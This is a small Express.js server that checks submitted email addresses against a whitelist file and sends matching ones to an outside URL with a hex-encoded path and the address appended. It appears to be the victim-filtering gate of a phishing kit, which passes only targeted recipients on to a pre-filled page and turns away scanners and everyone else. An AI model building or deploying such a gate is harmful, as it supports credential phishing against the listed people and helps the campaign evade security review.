const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

// Middleware to parse JSON and urlencoded data
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Load whitelist file on server start
const whitelistPath = path.join(__dirname, 'whitelist.txt');
let whitelist = [];
try {
  whitelist = fs.readFileSync(whitelistPath, 'utf-8')
    .split('\n')
    .map(email => email.trim().toLowerCase())
    .filter(email => email.length > 0);
  console.log('Whitelist loaded:', whitelist);
} catch (err) {
  console.error('Failed to load whitelist.txt', err);
  whitelist = [];
}

// Simple email regex for validation
const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

app.post('/check-email', (req, res) => {
  const email = (req.body.email || '').toLowerCase().trim();

  if (!emailRegex.test(email)) {
    return res.status(400).json({ success: false, message: 'Invalid email format' });
  }

  if (whitelist.includes(email)) {
    // Success - redirect URL could be sent here or handled client side
    return res.json({ success: true, redirectUrl: `https://grfresh.net/c65666973696f6e2e6265/${encodeURIComponent(email)}` });
  } else {
    return res.status(403).json({ success: false, message: 'Email not authorized' });
  }
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
